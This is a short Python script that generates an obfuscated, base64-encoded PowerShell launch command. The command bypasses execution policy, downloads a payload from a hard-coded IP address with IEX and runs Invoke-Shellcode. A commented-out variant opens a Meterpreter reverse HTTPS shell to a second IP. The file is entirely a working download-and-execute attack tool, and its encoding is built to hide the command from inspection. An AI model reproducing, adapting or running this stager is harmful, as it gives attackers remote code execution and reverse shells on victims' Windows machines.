import base64

command = "cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc "


powershell_command = "$browser = New-Object System.Net.WebClient; $browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials;"
#powershell_command += 'iex $browser.DownloadString("http://92.60.14.160:8000/payload"); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 212.47.254.99 -Lport 4444 -Force'
powershell_command += 'IEX $browser.DownloadString("http://92.60.14.160:8000/payload"); Invoke-Shellcode'

blank_command = ""
for char in powershell_command:
    blank_command += char + "\x00"

powershell_command = blank_command
powershell_command = base64.b64encode(powershell_command)
command += powershell_command
print command



